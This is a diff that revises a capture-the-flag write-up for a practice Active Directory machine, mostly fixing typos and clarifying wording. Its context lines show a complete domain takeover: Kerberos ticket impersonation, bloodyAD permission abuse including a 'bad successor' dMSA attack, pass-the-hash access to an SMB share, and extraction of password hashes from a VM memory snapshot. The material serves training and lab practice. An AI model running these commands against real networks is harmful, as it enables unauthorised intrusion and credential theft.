@@ -488,7 +488,7 @@ Beautiful. We have the kerberos-provisioned ticket for Ryan.Brooks. Let's use th
 kerbad.protocol.errors.KerberosError: get_TGS failed! Error Name: KDC_ERR_S_PRINCIPAL_UNKNOWN Detail: "Server not found in Kerberos database" 
     
 ```
-What happened? Essentially, the ticket was granted by krbtgt, but we are using bloodyAD which uses the ldap service. We must get a ticket for that spn. Also, in my case, I began to getting clock skew errors due to a time difference between my machine and the remote host. To remedy this, I began synchronizing the two before each command
+What happened? Essentially, the ticket was granted by krbtgt, but we are using bloodyAD which uses the ldap service. We must get a ticket for that spn. Also, in my case, I began getting clock skew errors due to a time difference between my machine and the remote host. To remedy this, I began synchronizing the two before each command
 
 ```
 sudo ntpdate -u checkpoint.htb; getST.py -k -no-pass -dc-ip 10.129.65.17 checkpoint.htb/ryan.brooks -spn ldap/checkpoint.htb
@@ -538,7 +538,7 @@ permission: CREATE_CHILD
 
 ```
 
-Awesome. We have write access over the svc_deploy account. We also CREATE CHILD privileges over a "DMSAHolder" group. Interesting. We'll look at that later.
+Awesome. We have write access over the svc_deploy account. We also CREATE CHILD privileges over a "DMSAHolder" organizational unit. Interesting. We'll look at that later.
 
 ```
 $ sudo ntpdate -u checkpoint.htb; bloodyad -H checkpoint.htb -d checkpoint.htb -k get object "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb"
@@ -580,17 +580,7 @@ whenCreated: 2026-05-09 09:01:19+00:00
 
 This user is part of the Remote Management group, meaning we can use it to get WinRM access, but more importantly it is also a member of the BackupAccess group. Earlier in the shares we saw there was a VMBackup share we couldn't access with either Alex, Mark, or Ryan. Seems we found our in. 
 
-First let's get a ticket for svc_deploy. We want to start adding DONT_REQ_PREAUTH
-
-```
- sudo ntpdate -u checkpoint.htb; bloodyad -H checkpoint.htb -k -d checkpoint.htb \
-  add uac svc_deploy -f DONT_REQ_PREAUTH
-2026-10-03 17:20:20.151366 (-0400) +25199.564747 +/- 0.016591 checkpoint.htb 10.129.65.17 s1 no-leap
-CLOCK: time stepped by 25199.564747
-[+] ['DONT_REQ_PREAUTH'] property flags added to svc_deploy's userAccountControl
-```
-
-What this does is it disables Kerberos preauthentication enabling us to ASREProast the account:
+First let's get a ticket for svc_deploy. 
 
 ```
 $ sudo ntpdate -u checkpoint.htb; getST.py -k -no-pass -dc-ip 10.129.65.17 checkpoint.htb/ryan.brooks -impersonate svc_deploy -spn ldap/checkpoint.htb 
@@ -608,7 +598,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [-] Probably user ryan.brooks does not have constrained delegation permisions or impersonated user does not exist
 
 ```
-Damn. Our user doesn't have permission to do this. However, because he has write access to svc_deploy and the group "DMSAHolder" it's possible we can attempt a bad successor attack. In essence, we create an object that has all of the same privileges as svc_deploy. BloodyAD is great for this.
+Damn. Our user doesn't have permission to do this. However, because he has write access to svc_deploy and the OU "DMSAHolder" it's possible we can attempt a bad successor attack. In essence, we create an object that has all of the same privileges as svc_deploy. BloodyAD is great for this.
 
 ```
 ┌──(.venv)─(kali㉿kali)-[~/Hacks/checkpoint]
@@ -656,6 +646,8 @@ Traceback (most recent call last):
 kerbad.protocol.errors.KerberosError:  Error Name: KRB_ERR_GENERIC Detail: "Generic error; the description is in the e-data field" 
 
 ```
+We included --prepatch to make sure that BloodyAD doesn't automatically establish the mutual link and TGT steps assuming the server is not patched. The patch requires mutual link validation when submitting a Kerberos ticket request. We will do that manually later.
+
 We get an error message, but it doesn't tell us much. Let's run get writable again and see if we were able to create anything.
 
 ```
@@ -755,7 +747,7 @@ CLOCK: time stepped by 25199.568348
 
 We successfully edit the svc_deploy account and make the fidel.hax object the superseded managed account for svc_deploy.
 
-Howver, when we try to edit the delegated dmsa state on fidel.hax in order to ensure that KDC treats fidel.hax as the legitimate successor to svc_deploy we get an error.
+However, when we try to edit the delegated dmsa state on fidel.hax in order to ensure that KDC treats fidel.hax as the legitimate successor to svc_deploy we get an error.
 
 ```
 (.venv)─(kali㉿kali)-[~/Hacks/checkpoint]
@@ -792,7 +784,7 @@ badldap.commons.exceptions.LDAPModifyException: insufficientAccessRights for CN=
 
 ```
 
-The problem is that we have genericWrite rights on fidel.hax, but not genericAll. Let's fix that and try again.
+The problem is that we don't have the necessary permissions to do this. Let's see if we can add genericAll permission on the user. This will enable all of the ACE permissions we need to make the change. 
 
 ```
 sudo ntpdate -u checkpoint.htb; bloodyad -H checkpoint.htb -k  -d checkpoint.htb add genericAll "CN=fidel.hax,OU=DMSAHolder,DC=checkpoint,DC=htb" ryan.brooks                                                                                                                           
@@ -856,20 +848,7 @@ WINRM       10.129.65.17    5985   DC01             [+] checkpoint.htb\svc_deplo
 
 Indeed. But before we pop a shell let's see what's in that VMBackup share.
 
-```
-$ smbclient \\\\checkpoint.htb\\VMBackups -u svc_deploy --pw-nt-hash e16081eb077aca74bdbf8af12af43ac9 
-
-Invalid option -u: unknown option
-
-Usage: smbclient [-?EgqBNPkV] [-?|--help] [--usage] [-M|--message=HOST] [-I|--ip-address=IP] [-E|--stderr] [-L|--list=HOST] [-T|--tar=<c|x>IXFvgbNan]
-        [-D|--directory=DIR] [-c|--command=STRING] [-b|--send-buffer=BYTES] [-t|--timeout=SECONDS] [-p|--port=PORT] [-g|--grepable] [-q|--quiet]
-        [-B|--browse] [-d|--debuglevel=DEBUGLEVEL] [--debug-stdout] [-s|--configfile=CONFIGFILE] [--option=name=value] [-l|--log-basename=LOGFILEBASE]
-        [--leak-report] [--leak-report-full] [-R|--name-resolve=NAME-RESOLVE-ORDER] [-O|--socket-options=SOCKETOPTIONS] [-m|--max-protocol=MAXPROTOCOL]
-        [-n|--netbiosname=NETBIOSNAME] [--netbios-scope=SCOPE] [-W|--workgroup=WORKGROUP] [--realm=REALM] [-U|--user=[DOMAIN/]USERNAME[%PASSWORD]]
-        [-N|--no-pass] [--password=STRING] [--pw-nt-hash] [-A|--authentication-file=FILE] [-P|--machine-pass] [--simple-bind-dn=DN]
-        [--use-kerberos=desired|required|off] [--use-krb5-ccache=CCACHE] [--use-winbind-ccache] [--client-protection=sign|encrypt|off] [-k|--kerberos]
-        [-V|--version] [OPTIONS] service <password>
-                                                                                                                                                            
+```                                                  
 ┌──(kali㉿kali)-[~/Hacks/checkpoint]
 └─$ smbclient \\\\checkpoint.htb\\VMBackups -U svc_deploy --pw-nt-hash e16081eb077aca74bdbf8af12af43ac9 
 Try "help" to get a list of possible commands.
@@ -902,13 +881,13 @@ smb: \NightlyBackup_2024-11-01\memory forensics\> ls
 
 ```
 
-Jackpot. We can most likely get the Administrtor hash from here. Let's first download the Windows Server 2019-Snapshot1.vmem file so we can inspect it from our machine. This file is a snapshot of the VM's ram when the snapshot was taken.
+Jackpot. We can most likely get the Administrator hash from here. Let's first download the Windows Server 2019-Snapshot1.vmem file so we can inspect it from our machine. This file is a snapshot of the VM's ram when the snapshot was taken.
 
 ```
 get Windows Server 2019-Snapshot1.vmem
 ```
 
-Using volatility3, we can extract the hashes from the vmmem file. 
+Using volatility3, we can extract the hashes from the vmem file. 
 
 ```
 ─$ vol -f 'Windows Server 2019-Snapshot1.vmem' windows.hashdump.Hashdump
@@ -946,6 +925,6 @@ Info: Establishing connection to remote endpoint
 
 ```
 
-And voila, we own the entire domain. We can find the root flag in max.palmer's desktop. 
+And voila, we own the entire domain. We can find the root flag in max.palmer's desktop. It looks like the administrator is reusing the same password they were using when the snapshot was taken. Rookie mistake. 
 
 This was an incredibly challenging machine for a medium but it forced me to learn a ton about how active directory handles user privileges and how to protect them from bad successor attacks. 
